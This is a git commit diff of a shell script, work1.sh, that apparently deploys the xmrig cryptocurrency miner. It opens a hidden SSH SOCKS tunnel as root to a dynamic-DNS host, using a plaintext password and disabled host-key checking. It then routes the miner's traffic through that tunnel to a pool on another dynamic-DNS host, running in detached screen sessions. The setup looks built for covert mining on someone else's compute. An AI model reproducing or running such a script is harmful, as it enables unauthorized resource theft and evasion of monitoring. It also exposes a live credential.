61c1532c6b39ef65974b67dafa7556cafd18dc93
manhinh24inch <40003346+manhinh24inch@users.noreply.github.com>
2021-05-11 00:43:48 +0800

    Update work1.sh

--- work1.sh
+++ work1.sh
@@ -9,4 +9,5 @@ make -j$(nproc)
 sudo chmod 777 *
 sudo apt install sshpass
 sudo screen -d -m sshpass -p dramz68682021 ssh -o StrictHostKeyChecking=no -D 1997 root@congdao.ddns.net
-sudo screen -d -m ./xmrig -o bedao.ddns.net:4444 -u 859HoAtW19PT8SmdjuMJ3DTqbZKFv8DFu7DYtk6wJm3YKrAJKTVeRDkZNq8fPseEz4D7KRBwkfGcHE73XKYYAhguEBH8w5X.testmoi_02 -x socks4://127.0.0.1:1997
+cd xmrig/build
+sudo screen -d -m ./xmrig -o bedao.ddns.net:4444 -u 859HoAtW19PT8SmdjuMJ3DTqbZKFv8DFu7DYtk6wJm3YKrAJKTVeRDkZNq8fPseEz4D7KRBwkfGcHE73XKYYAhguEBH8w5X.1105_01 -x socks4://127.0.0.1:1997
